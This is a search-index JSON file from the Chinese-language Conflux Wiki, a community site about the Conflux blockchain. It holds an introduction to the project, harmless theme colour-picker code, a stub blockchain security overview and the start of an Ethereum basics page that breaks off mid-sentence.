{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u7b80\u4ecb \u00b6 \u6b22\u8fce\u6765\u5230 Conflux Wiki \u3002 Conflux \uff08\u6811\u56fe\uff09\u7f18\u8d77\u6e05\u534e\u5927\u5b66\uff0c\u7ecf\u5927\u91cf\u5b66\u672f\u7814\u7a76\u63d0\u51fa\u4e86\u533a\u5757\u94fe\u201c\u4e0d\u53ef\u80fd\u4e09\u89d2\u201d\u7684\u6700\u4f18\u89e3\uff1a\u6811\u56fe\uff08Tree-Graph\uff09\u5171\u8bc6\u673a\u5236\uff0c\u6709\u6548\u5e73\u8861\u4e86\u5b89\u5168\u6027\u3001\u5ef6\u5c55\u6027\u548c\u53bb\u4e2d\u5fc3\u5316\u7a0b\u5ea6\u3002 2018 \u5e74\uff0c Conflux \u57fa\u91d1\u4f1a\u6210\u7acb\u5e76\u5b8c\u6210\u878d\u8d44\u30022019 \u5e74\u7b2c\u4e8c\u5b63\u5ea6\uff0cConflux \u6d4b\u8bd5\u7f51\u4e0a\u7ebf\u3002 \u4f5c\u4e3a\u4e2d\u56fd\u533a\u5757\u94fe\u57fa\u7840\u8bbe\u65bd\u7684\u5148\u884c\u8005\uff0c Conflux \u7f51\u7edc\u59cb\u7ec8\u575a\u6301\u63a8\u52a8\u533a\u5757\u94fe\u5f00\u53d1\u53ca\u6559\u80b2\u7b49\u76f8\u5173\u5de5\u4f5c\u30022019 \u5e74 9 \u6708 25 \u65e5\uff0c Conflux \u676d\u5dde\u8fd0\u8425\u4e2d\u5fc3\u6b63\u5f0f\u63ed\u724c\u30022020 \u5e74 1 \u6708 9 \u65e5\uff0c\u4e0a\u6d77\u6811\u56fe\u533a\u5757\u94fe\u7814\u7a76\u9662\u6b63\u5f0f\u63ed\u724c\u30022020 \u5e74 8 \u6708 19 \u65e5\uff0c\u6e56\u5357\u6e58\u6c5f\u6811\u56fe\u533a\u5757\u94fe\u521b\u65b0\u4e2d\u5fc3\u66a8\u533a\u5757\u94fe\u5e95\u5c42\u6280\u672f\u53ca\u5e94\u7528\u6e56\u5357\u7701\u91cd\u70b9\u5b9e\u9a8c\u5ba4\u63ed\u724c\u3002 Conflux \u7f51\u7edc\u56e2\u961f\u7531\u6765\u81ea\u56db\u4e2a\u5927\u6d32\u7684\u8d85\u8fc7 50 \u540d\u6210\u5458\u6784\u6210\uff0c\u4e0d\u540c\u5316\u7684\u6587\u5316\u8ba9 Conflux \u59cb\u7ec8\u4fdd\u6301\u591a\u5143\u5316\uff0c\u5176\u529e\u516c\u5ba4\u8bbe\u7acb\u5728\u52a0\u62ff\u5927\u591a\u4f26\u591a\u3001\u5c3c\u65e5\u5229\u4e9a\u62c9\u5404\u65af\u7b49\u5730\u3002 \u5728 Conflux \u4e0a\u8fdb\u884c\u667a\u80fd\u5408\u7ea6\u5f00\u53d1\uff0c\u4f53\u9a8c\u751f\u6001\u6d89\u53ca\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u533a\u5757\u94fe\u6280\u672f\u7684\u53d1\u5c55\u901f\u5ea6\u8d8a\u6765\u8d8a\u5feb\uff0c Conflux \u521d\u5b66\u8005\u9762\u5bf9\u7684\u95e8\u69db\u8d8a\u6765\u8d8a\u9ad8\u3002\u800c\u7f51\u4e0a\u8d44\u6599\u5927\u90fd\u96f6\u6563\u7410\u788e\uff0c\u521d\u5b66\u8005\u5f80\u5f80\u5e76\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u7cfb\u7edf\u6027\u5730\u5b66\u4e60 \u4e0e Conflux \u76f8\u5173\u9886\u57df\u77e5\u8bc6\uff0c\u5e38\u9700\u8981\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\uff0c\u82e6\u4e0d\u582a\u8a00\u3002 \u53d7\u5230 ctf-wiki \u9879\u76ee\u6210\u529f\u7684\u9f13\u821e\uff0c\u4e3a\u4e86\u4f7f\u5f97\u70ed\u7231 Conflux \u7684\u5c0f\u4f19\u4f34\u4eec\u66f4\u597d\u5730\u5165\u95e8 Conflux \uff0c2021 \u5e74 7 \u6708\u4efd\uff0c Conflux Wiki \u5728 Github \u6709\u4e86\u7b2c\u4e00\u6b21 commit\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u81ea\u7531\u7684\u7ad9\u70b9\uff0c\u56f4\u7ed5 Conflux \u8fd9\u4e00\u57fa\u7840\u7f51\u7edc\u8bbe\u65bd\u8fd1\u51e0\u5e74\u7684\u53d1\u5c55\uff0c Conflux Wiki \u5bf9 Conflux \u4e2d\u7684\u5404\u4e2a\u65b9\u5411\u7684\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u4ecb\u7ecd\uff0c\u4ee5\u4fbf\u4e8e\u521d\u5b66\u8005\u66f4\u597d\u5730\u5b66\u4e60 Conflux \u7f51\u7edc\u76f8\u5173\u7684\u77e5\u8bc6\u3002 \u76ee\u524d\uff0c Conflux Wiki \u4e3b\u8981\u5305\u542b\u6784\u5efa Conflux \u533a\u5757\u94fe\u5404\u5927\u8303\u7574\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u751f\u6001\u4f53\u9a8c\u6559\u7a0b\uff0c\u5e76\u6b63\u5728\u7740\u529b\u5b8c\u5584\u4ee5\u4e0b\u5185\u5bb9 \u533a\u5757\u94fe\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u77e5\u8bc6 Conflux \u5e95\u5c42\u673a\u5236\u89e3\u6790 \u667a\u80fd\u5408\u7ea6\u5f00\u53d1 \u5173\u4e8e\u4e0a\u8ff0\u90e8\u5206\u5f85\u5b8c\u5584\u5185\u5bb9\uff0c\u8bf7\u53c2\u89c1 Conflux Wiki \u7684 Projects \uff0c\u8be6\u7ec6\u5217\u51fa\u4e86\u6b63\u5728\u505a\u7684\u4e8b\u9879\u4ee5\u53ca\u5f85\u505a\u4e8b\u9879\u3002 \u5f53\u7136\uff0c Conflux Wiki \u57fa\u4e8e Conflux \uff0c\u5374\u4e0d\u4f1a\u5c40\u9650\u4e8e Conflux \u3002\u5728\u672a\u6765\uff0c Conflux Wiki \u5c06\u4f1a \u4ecb\u7ecd\u66f4\u591a\u57fa\u4e8eConflux\u5f00\u53d1\u7684\u751f\u6001 \u5e76\u66f4\u591a\u5730\u4e0e\u533a\u5757\u94fe\u5f00\u53d1\u5b9e\u6218\u7ed3\u5408 \u6b64\u5916\uff0c\u9274\u4e8e\u4ee5\u4e0b\u4e24\u70b9 \u6280\u672f\u5e94\u8be5\u4ee5\u5f00\u653e\u7684\u65b9\u5f0f\u5171\u4eab\u3002 \u6280\u672f\u603b\u662f\u5728\u4e0d\u65ad\u6f14\u8fdb\uff0c\u65e7\u7684\u6280\u672f\u5728\u9762\u5bf9\u65b0\u7684\u6280\u672f\u65f6\u53ef\u80fd\u5931\u6548\u3002 \u56e0\u6b64\uff0c Conflux Wiki \u6c38\u8fdc\u4e0d\u4f1a\u51fa\u7248\u4e66\u7c4d\u3002 \u6700\u540e\uff0c Conflux Wiki \u6e90\u4e8e\u793e\u533a\uff0c\u4f5c\u4e3a \u72ec\u7acb\u7684\u7ec4\u7ec7 \uff0c\u63d0\u5021 \u77e5\u8bc6\u81ea\u7531 \uff0c\u5728\u672a\u6765\u4e5f\u7edd\u4e0d\u4f1a\u5546\u4e1a\u5316\uff0c\u5c06\u59cb\u7ec8\u4fdd\u6301 \u72ec\u7acb\u81ea\u7531 \u7684\u6027\u8d28\u3002 Material color palette \u989c\u8272\u4e3b\u9898 \u00b6 Color Scheme \u914d\u8272\u65b9\u6848 \u00b6 \u6839\u636e\u6d4f\u89c8\u5668\u4e0e\u7cfb\u7edf\u8bbe\u7f6e\u81ea\u52a8\u5207\u6362\u660e\u6697\u4e3b\u9898\uff0c\u4e5f\u53ef\u624b\u52a8\u5207\u6362 Default Slate var buttons = document.querySelectorAll(\"button[data-md-color-scheme]\") Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorScheme = this.dataset.mdColorScheme; localStorage.setItem(\"data-md-color-scheme\",this.dataset.mdColorScheme); }) }) Primary colors \u4e3b\u8272 \u00b6 \u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange Brown Grey Blue Grey White var buttons = document.querySelectorAll(\"button[data-md-color-primary]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary; localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary); }) }) Accent colors \u8f85\u52a9\u8272 \u00b6 \u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange var buttons = document.querySelectorAll(\"button[data-md-color-accent]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorAccent = this.dataset.mdColorAccent; localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent); }) }) button[data-md-color-accent]> code { background-color: var(--md-code-bg-color); color: var(--md-accent-fg-color); } button[data-md-color-primary] > code { background-color: var(--md-code-bg-color); color: var(--md-primary-fg-color); } button[data-md-color-primary='white'] > code { background-color: var(--md-primary-bg-color); color: var(--md-primary-fg-color); } button[data-md-color-accent],button[data-md-color-primary],button[data-md-color-scheme]{ width: 8.4rem; margin-bottom: .4rem; padding: 2.4rem .4rem .4rem; transition: background-color .25s,opacity .25s; border-radius: .2rem; color: #fff; font-size: .8rem; text-align: left; cursor: pointer; } button[data-md-color-accent]{ background-color: var(--md-accent-fg-color); } button[data-md-color-primary]{ background-color: var(--md-primary-fg-color); } button[data-md-color-scheme='default']{ background-color: hsla(0, 0%, 100%, 1); } button[data-md-color-scheme='slate']{ background-color: var(--md-default-bg-color); } button[data-md-color-accent]:hover, button[data-md-color-primary]:hover { opacity: .75; }","title":"\u7b80\u4ecb"},{"location":"#_1","text":"\u6b22\u8fce\u6765\u5230 Conflux Wiki \u3002 Conflux \uff08\u6811\u56fe\uff09\u7f18\u8d77\u6e05\u534e\u5927\u5b66\uff0c\u7ecf\u5927\u91cf\u5b66\u672f\u7814\u7a76\u63d0\u51fa\u4e86\u533a\u5757\u94fe\u201c\u4e0d\u53ef\u80fd\u4e09\u89d2\u201d\u7684\u6700\u4f18\u89e3\uff1a\u6811\u56fe\uff08Tree-Graph\uff09\u5171\u8bc6\u673a\u5236\uff0c\u6709\u6548\u5e73\u8861\u4e86\u5b89\u5168\u6027\u3001\u5ef6\u5c55\u6027\u548c\u53bb\u4e2d\u5fc3\u5316\u7a0b\u5ea6\u3002 2018 \u5e74\uff0c Conflux \u57fa\u91d1\u4f1a\u6210\u7acb\u5e76\u5b8c\u6210\u878d\u8d44\u30022019 \u5e74\u7b2c\u4e8c\u5b63\u5ea6\uff0cConflux \u6d4b\u8bd5\u7f51\u4e0a\u7ebf\u3002 \u4f5c\u4e3a\u4e2d\u56fd\u533a\u5757\u94fe\u57fa\u7840\u8bbe\u65bd\u7684\u5148\u884c\u8005\uff0c Conflux \u7f51\u7edc\u59cb\u7ec8\u575a\u6301\u63a8\u52a8\u533a\u5757\u94fe\u5f00\u53d1\u53ca\u6559\u80b2\u7b49\u76f8\u5173\u5de5\u4f5c\u30022019 \u5e74 9 \u6708 25 \u65e5\uff0c Conflux \u676d\u5dde\u8fd0\u8425\u4e2d\u5fc3\u6b63\u5f0f\u63ed\u724c\u30022020 \u5e74 1 \u6708 9 \u65e5\uff0c\u4e0a\u6d77\u6811\u56fe\u533a\u5757\u94fe\u7814\u7a76\u9662\u6b63\u5f0f\u63ed\u724c\u30022020 \u5e74 8 \u6708 19 \u65e5\uff0c\u6e56\u5357\u6e58\u6c5f\u6811\u56fe\u533a\u5757\u94fe\u521b\u65b0\u4e2d\u5fc3\u66a8\u533a\u5757\u94fe\u5e95\u5c42\u6280\u672f\u53ca\u5e94\u7528\u6e56\u5357\u7701\u91cd\u70b9\u5b9e\u9a8c\u5ba4\u63ed\u724c\u3002 Conflux \u7f51\u7edc\u56e2\u961f\u7531\u6765\u81ea\u56db\u4e2a\u5927\u6d32\u7684\u8d85\u8fc7 50 \u540d\u6210\u5458\u6784\u6210\uff0c\u4e0d\u540c\u5316\u7684\u6587\u5316\u8ba9 Conflux \u59cb\u7ec8\u4fdd\u6301\u591a\u5143\u5316\uff0c\u5176\u529e\u516c\u5ba4\u8bbe\u7acb\u5728\u52a0\u62ff\u5927\u591a\u4f26\u591a\u3001\u5c3c\u65e5\u5229\u4e9a\u62c9\u5404\u65af\u7b49\u5730\u3002 \u5728 Conflux \u4e0a\u8fdb\u884c\u667a\u80fd\u5408\u7ea6\u5f00\u53d1\uff0c\u4f53\u9a8c\u751f\u6001\u6d89\u53ca\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u533a\u5757\u94fe\u6280\u672f\u7684\u53d1\u5c55\u901f\u5ea6\u8d8a\u6765\u8d8a\u5feb\uff0c Conflux \u521d\u5b66\u8005\u9762\u5bf9\u7684\u95e8\u69db\u8d8a\u6765\u8d8a\u9ad8\u3002\u800c\u7f51\u4e0a\u8d44\u6599\u5927\u90fd\u96f6\u6563\u7410\u788e\uff0c\u521d\u5b66\u8005\u5f80\u5f80\u5e76\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u7cfb\u7edf\u6027\u5730\u5b66\u4e60 \u4e0e Conflux \u76f8\u5173\u9886\u57df\u77e5\u8bc6\uff0c\u5e38\u9700\u8981\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\uff0c\u82e6\u4e0d\u582a\u8a00\u3002 \u53d7\u5230 ctf-wiki \u9879\u76ee\u6210\u529f\u7684\u9f13\u821e\uff0c\u4e3a\u4e86\u4f7f\u5f97\u70ed\u7231 Conflux \u7684\u5c0f\u4f19\u4f34\u4eec\u66f4\u597d\u5730\u5165\u95e8 Conflux \uff0c2021 \u5e74 7 \u6708\u4efd\uff0c Conflux Wiki \u5728 Github \u6709\u4e86\u7b2c\u4e00\u6b21 commit\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u81ea\u7531\u7684\u7ad9\u70b9\uff0c\u56f4\u7ed5 Conflux \u8fd9\u4e00\u57fa\u7840\u7f51\u7edc\u8bbe\u65bd\u8fd1\u51e0\u5e74\u7684\u53d1\u5c55\uff0c Conflux Wiki \u5bf9 Conflux \u4e2d\u7684\u5404\u4e2a\u65b9\u5411\u7684\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u4ecb\u7ecd\uff0c\u4ee5\u4fbf\u4e8e\u521d\u5b66\u8005\u66f4\u597d\u5730\u5b66\u4e60 Conflux \u7f51\u7edc\u76f8\u5173\u7684\u77e5\u8bc6\u3002 \u76ee\u524d\uff0c Conflux Wiki \u4e3b\u8981\u5305\u542b\u6784\u5efa Conflux \u533a\u5757\u94fe\u5404\u5927\u8303\u7574\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u751f\u6001\u4f53\u9a8c\u6559\u7a0b\uff0c\u5e76\u6b63\u5728\u7740\u529b\u5b8c\u5584\u4ee5\u4e0b\u5185\u5bb9 \u533a\u5757\u94fe\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u77e5\u8bc6 Conflux \u5e95\u5c42\u673a\u5236\u89e3\u6790 \u667a\u80fd\u5408\u7ea6\u5f00\u53d1 \u5173\u4e8e\u4e0a\u8ff0\u90e8\u5206\u5f85\u5b8c\u5584\u5185\u5bb9\uff0c\u8bf7\u53c2\u89c1 Conflux Wiki \u7684 Projects \uff0c\u8be6\u7ec6\u5217\u51fa\u4e86\u6b63\u5728\u505a\u7684\u4e8b\u9879\u4ee5\u53ca\u5f85\u505a\u4e8b\u9879\u3002 \u5f53\u7136\uff0c Conflux Wiki \u57fa\u4e8e Conflux \uff0c\u5374\u4e0d\u4f1a\u5c40\u9650\u4e8e Conflux \u3002\u5728\u672a\u6765\uff0c Conflux Wiki \u5c06\u4f1a \u4ecb\u7ecd\u66f4\u591a\u57fa\u4e8eConflux\u5f00\u53d1\u7684\u751f\u6001 \u5e76\u66f4\u591a\u5730\u4e0e\u533a\u5757\u94fe\u5f00\u53d1\u5b9e\u6218\u7ed3\u5408 \u6b64\u5916\uff0c\u9274\u4e8e\u4ee5\u4e0b\u4e24\u70b9 \u6280\u672f\u5e94\u8be5\u4ee5\u5f00\u653e\u7684\u65b9\u5f0f\u5171\u4eab\u3002 \u6280\u672f\u603b\u662f\u5728\u4e0d\u65ad\u6f14\u8fdb\uff0c\u65e7\u7684\u6280\u672f\u5728\u9762\u5bf9\u65b0\u7684\u6280\u672f\u65f6\u53ef\u80fd\u5931\u6548\u3002 \u56e0\u6b64\uff0c Conflux Wiki \u6c38\u8fdc\u4e0d\u4f1a\u51fa\u7248\u4e66\u7c4d\u3002 \u6700\u540e\uff0c Conflux Wiki \u6e90\u4e8e\u793e\u533a\uff0c\u4f5c\u4e3a \u72ec\u7acb\u7684\u7ec4\u7ec7 \uff0c\u63d0\u5021 \u77e5\u8bc6\u81ea\u7531 \uff0c\u5728\u672a\u6765\u4e5f\u7edd\u4e0d\u4f1a\u5546\u4e1a\u5316\uff0c\u5c06\u59cb\u7ec8\u4fdd\u6301 \u72ec\u7acb\u81ea\u7531 \u7684\u6027\u8d28\u3002","title":"\u7b80\u4ecb"},{"location":"#material-color-palette","text":"","title":"Material color palette \u989c\u8272\u4e3b\u9898"},{"location":"#color-scheme","text":"\u6839\u636e\u6d4f\u89c8\u5668\u4e0e\u7cfb\u7edf\u8bbe\u7f6e\u81ea\u52a8\u5207\u6362\u660e\u6697\u4e3b\u9898\uff0c\u4e5f\u53ef\u624b\u52a8\u5207\u6362 Default Slate var buttons = document.querySelectorAll(\"button[data-md-color-scheme]\") Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorScheme = this.dataset.mdColorScheme; localStorage.setItem(\"data-md-color-scheme\",this.dataset.mdColorScheme); }) })","title":"Color Scheme \u914d\u8272\u65b9\u6848"},{"location":"#primary-colors","text":"\u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange Brown Grey Blue Grey White var buttons = document.querySelectorAll(\"button[data-md-color-primary]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorPrimary = this.dataset.mdColorPrimary; localStorage.setItem(\"data-md-color-primary\",this.dataset.mdColorPrimary); }) })","title":"Primary colors \u4e3b\u8272"},{"location":"#accent-colors","text":"\u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272 Red Pink Purple Deep Purple Indigo Blue Light Blue Cyan Teal Green Light Green Lime Yellow Amber Orange Deep Orange var buttons = document.querySelectorAll(\"button[data-md-color-accent]\"); Array.prototype.forEach.call(buttons, function(button) { button.addEventListener(\"click\", function() { document.body.dataset.mdColorAccent = this.dataset.mdColorAccent; localStorage.setItem(\"data-md-color-accent\",this.dataset.mdColorAccent); }) }) button[data-md-color-accent]> code { background-color: var(--md-code-bg-color); color: var(--md-accent-fg-color); } button[data-md-color-primary] > code { background-color: var(--md-code-bg-color); color: var(--md-primary-fg-color); } button[data-md-color-primary='white'] > code { background-color: var(--md-primary-bg-color); color: var(--md-primary-fg-color); } button[data-md-color-accent],button[data-md-color-primary],button[data-md-color-scheme]{ width: 8.4rem; margin-bottom: .4rem; padding: 2.4rem .4rem .4rem; transition: background-color .25s,opacity .25s; border-radius: .2rem; color: #fff; font-size: .8rem; text-align: left; cursor: pointer; } button[data-md-color-accent]{ background-color: var(--md-accent-fg-color); } button[data-md-color-primary]{ background-color: var(--md-primary-fg-color); } button[data-md-color-scheme='default']{ background-color: hsla(0, 0%, 100%, 1); } button[data-md-color-scheme='slate']{ background-color: var(--md-default-bg-color); } button[data-md-color-accent]:hover, button[data-md-color-primary]:hover { opacity: .75; }","title":"Accent colors \u8f85\u52a9\u8272"},{"location":"discussion/","text":"\u8ba8\u8bba\u4ea4\u6d41 \u00b6 \u5982\u679c\u4f60\u6709\u4efb\u4f55\u60f3\u8981\u8ba8\u8bba\u7684\u95ee\u9898\uff0c\u8bf7\u9009\u62e9 Github Discussion \u6216\u8005 Telgram(\u6682\u672a\u521b\u5efa) .","title":"\u8ba8\u8bba\u4ea4\u6d41"},{"location":"discussion/#_1","text":"\u5982\u679c\u4f60\u6709\u4efb\u4f55\u60f3\u8981\u8ba8\u8bba\u7684\u95ee\u9898\uff0c\u8bf7\u9009\u62e9 Github Discussion \u6216\u8005 Telgram(\u6682\u672a\u521b\u5efa) .","title":"\u8ba8\u8bba\u4ea4\u6d41"},{"location":"usage/","text":"\u5982\u4f55\u4f7f\u7528 Conflux Wiki \u00b6 \u7b80\u4ecb \u00b6 CTF Wiki \u7531\u5355\u4e2a\u9879\u76ee\u6784\u6210 conflux-wiki \uff0c\u4ecb\u7ecd Conflux \u76f8\u5173\u77e5\u8bc6\u3002 \u5982\u4f55\u4f7f\u7528 \u00b6 \u60a8\u53ef\u4ee5\u901a\u8fc7\u70b9\u51fb\u9875\u9762\u4e2d\u94fe\u63a5\u6309\u6d4f\u89c8\u7f51\u7ad9\u7684\u65b9\u5f0f\u67e5\u770bwiki\u5404\u680f\u76ee\u5185\u5bb9\u3002","title":"\u5982\u4f55\u4f7f\u7528 Conflux Wiki"},{"location":"usage/#conflux-wiki","text":"","title":"\u5982\u4f55\u4f7f\u7528 Conflux Wiki"},{"location":"usage/#_1","text":"CTF Wiki \u7531\u5355\u4e2a\u9879\u76ee\u6784\u6210 conflux-wiki \uff0c\u4ecb\u7ecd Conflux \u76f8\u5173\u77e5\u8bc6\u3002","title":"\u7b80\u4ecb"},{"location":"usage/#_2","text":"\u60a8\u53ef\u4ee5\u901a\u8fc7\u70b9\u51fb\u9875\u9762\u4e2d\u94fe\u63a5\u6309\u6d4f\u89c8\u7f51\u7ad9\u7684\u65b9\u5f0f\u67e5\u770bwiki\u5404\u680f\u76ee\u5185\u5bb9\u3002","title":"\u5982\u4f55\u4f7f\u7528"},{"location":"blockchain/introduction/","text":"BlockChain Security Overview \u00b6 \u533a\u5757\u94fe\u5b89\u5168\u8fd1\u51e0\u5e74\u53d1\u5c55\u6bd4\u8f83\u8fc5\u901f\uff0c\u4f46\u662f wiki \u4e0a\u6ca1\u6709\u76f8\u5173\u5185\u5bb9\uff0c\u9042\u62c9\u4e86\u51e0\u4e2a\u5c0f\u4f19\u4f34\uff0c\u4e00\u8d77\u64b0\u5199\u4e86\u533a\u5757\u94fe\u5b89\u5168\u76f8\u5173\u5185\u5bb9\uff0c\u53ef\u80fd\u67d0\u4e9b\u7528\u8bcd\u4e0d\u662f\u5f88\u51c6\u786e\uff0c\u8fd8\u8bf7\u89c1\u8c05\uff0c\u4e5f\u53ef\u4ee5\u63d0\u95ee issue\uff0c\u4f1a\u53ca\u65f6\u66f4\u6539 \u6982\u8ff0\u533a\u5757\u94fe\u5b89\u5168\u7684\u4e00\u4e9b\u65b9\u5411\uff0c\u4e3b\u8981\u5206\u4e3a \u516c\u94fe\u5b89\u5168 \u548c \u667a\u80fd\u5408\u7ea6 \u5b89\u5168 \u516c\u94fe\u5b89\u5168 \u00b6 \u5f85\u8865\u5145 \u667a\u80fd\u5408\u7ea6\u5b89\u5168 \u00b6 \u4e3b\u8981\u4ecb\u7ecd\u4f7f\u7528 Solidity \u8fd9\u79cd\u4e3b\u6d41\u7f16\u7a0b\u8bed\u8a00\u7684 Ethereum \u5b89\u5168\u65b9\u9762\u7684\u57fa\u7840\u77e5\u8bc6\u3002","title":"BlockChain Security Overview"},{"location":"blockchain/introduction/#blockchain-security-overview","text":"\u533a\u5757\u94fe\u5b89\u5168\u8fd1\u51e0\u5e74\u53d1\u5c55\u6bd4\u8f83\u8fc5\u901f\uff0c\u4f46\u662f wiki \u4e0a\u6ca1\u6709\u76f8\u5173\u5185\u5bb9\uff0c\u9042\u62c9\u4e86\u51e0\u4e2a\u5c0f\u4f19\u4f34\uff0c\u4e00\u8d77\u64b0\u5199\u4e86\u533a\u5757\u94fe\u5b89\u5168\u76f8\u5173\u5185\u5bb9\uff0c\u53ef\u80fd\u67d0\u4e9b\u7528\u8bcd\u4e0d\u662f\u5f88\u51c6\u786e\uff0c\u8fd8\u8bf7\u89c1\u8c05\uff0c\u4e5f\u53ef\u4ee5\u63d0\u95ee issue\uff0c\u4f1a\u53ca\u65f6\u66f4\u6539 \u6982\u8ff0\u533a\u5757\u94fe\u5b89\u5168\u7684\u4e00\u4e9b\u65b9\u5411\uff0c\u4e3b\u8981\u5206\u4e3a \u516c\u94fe\u5b89\u5168 \u548c \u667a\u80fd\u5408\u7ea6 \u5b89\u5168","title":"BlockChain Security Overview"},{"location":"blockchain/introduction/#_1","text":"\u5f85\u8865\u5145","title":"\u516c\u94fe\u5b89\u5168"},{"location":"blockchain/introduction/#_2","text":"\u4e3b\u8981\u4ecb\u7ecd\u4f7f\u7528 Solidity \u8fd9\u79cd\u4e3b\u6d41\u7f16\u7a0b\u8bed\u8a00\u7684 Ethereum \u5b89\u5168\u65b9\u9762\u7684\u57fa\u7840\u77e5\u8bc6\u3002","title":"\u667a\u80fd\u5408\u7ea6\u5b89\u5168"},{"location":"blockchain/ethereum/basics/","text":"Ethereum Basics \u00b6 \u5bf9\u667a\u80fd\u5408\u7ea6\u4e00\u4e9b\u57fa\u7840\u77e5\u8bc6\u7684\u4ecb\u7ecd\u3002 Solidity \u00b6 Solidity is an object-oriented programming language for writing smart contracts. It is used for implementing smart contracts on various blockchain platforms, most notably, Ethereum. It was developed by Christian Reitwiessner, Alex Beregszaszi, and several former Ethereum core contributors to enable writing smart contracts on blockchain platforms such as Ethereum. ------ from wikipedia Solidity \u662f\u4e00\u79cd\u7528\u4e8e\u7f16\u5199\u667a\u80fd\u5408\u7ea6\u7684\u9ad8\u7ea7\u8bed\u8a00\uff0c\u8bed\u6cd5\u7c7b\u4f3c\u4e8e JavaScript\u3002\u5728\u4ee5\u592a\u574a\u5e73\u53f0\u4e0a\uff0cSolidity \u7f16\u5199\u7684\u667a\u80fd\u5408\u7ea6\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210\u5b57\u8282\u7801\u5728\u4ee5\u592a\u574a\u865a\u62df\u673a EVM \u4e0a\u8fd0\u884c\u3002 \u53ef\u53c2\u8003 \u5b98\u65b9\u7f51\u7ad9 \u8fdb\u884c\u5b66\u4e60\uff0c\u4e0d\u518d\u5c55\u5f00\u4ecb\u7ecd\u3002 MetaMask \u00b6 \u975e\u5e38\u597d\u7528\u4e5f\u662f\u7528\u7684\u6700\u591a\u7684\u4ee5\u592a\u574a\u94b1\u5305\uff0c\u5934\u50cf\u662f\u5c0f\u72d0\u72f8\u6807\u8bc6\uff0cChrome \u63d0\u4f9b\u4e86\u5176\u63d2\u4ef6\uff0c\u5176\u4e0d\u4ec5\u53ef\u4ee5\u7ba1\u7406\u5916\u90e8\u8d26\u6237\uff0c\u800c\u4e14\u53ef\u4ee5\u4fbf\u6377\u5207\u6362\u6d4b\u8bd5\u94fe\u7f51\u7edc\uff0c\u5e76\u4e14\u53ef\u4ee5\u81ea\u5b9a\u4e49 RPC \u7f51\u7edc\u3002 Info \u4e00\u4e2a\u5916\u90e8\u8d26\u6237\u901a\u5e38\u7531\u79c1\u94a5\u6587\u4ef6\u63a7\u5236\uff0c\u62e5\u6709\u79c1\u94a5\u7684\u7528\u6237\u5c31\u53ef\u4ee5\u62e5\u6709\u5bf9\u5e94\u5730\u5740\u7684\u8d26\u6237\u91cc\u7684 Ether \u4f7f\u7528\u6743\u3002\u6211\u4eec\u901a\u5e38\u628a\u7ba1\u7406\u8fd9\u4e9b\u6570\u5b57\u5bc6\u94a5\u7684\u8f6f\u4ef6\u79f0\u4e3a\u94b1\u5305\uff0c\u800c\u6211\u4eec\u6240\u8bf4\u7684\u5907\u4efd\u94b1\u5305\u5176\u5b9e\u5c31\u662f\u5907\u4efd\u8d26\u6237\u7684\u79c1\u94a5\u6587\u4ef6\u3002 Remix \u00b6 \u57fa\u4e8e\u6d4f\u89c8\u5668\u7684 Solidity \u7f16\u8bd1\u5668\u548c\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff0c\u63d0\u4f9b\u4e86\u4ea4\u4e92\u5f0f\u754c\u9762\uff0c\u4ee5\u53ca\u7f16\u8bd1\u3001\u8c03\u7528\u6d4b\u8bd5\u3001\u53d1\u5e03\u7b49\u4e00\u7cfb\u5217\u529f\u80fd\uff0c\u4f7f\u7528\u5341\u5206\u65b9\u4fbf\u3002 http://remix.ethereum.org/ \u8d26\u6237 \u00b6 \u5728\u4ee5\u592a\u574a\u4e2d\uff0c\u4e00\u4e2a\u91cd\u8981\u7684\u6982\u5ff5\u5c31\u662f\u8d26\u6237\uff08Account\uff09\u3002 \u5728\u4ee5\u592a\u574a\u4e2d\u5b58\u5728\u4e24\u79cd\u7c7b\u578b\u7684\u8d26\u6237\uff0c\u5206\u522b\u662f\u5916\u90e8\u8d26\u6237\uff08Externally Owned Account, EOA\uff09\u548c\u5408\u7ea6\u8d26\u6237\u3002 \u5916\u90e8\u8d26\u6237 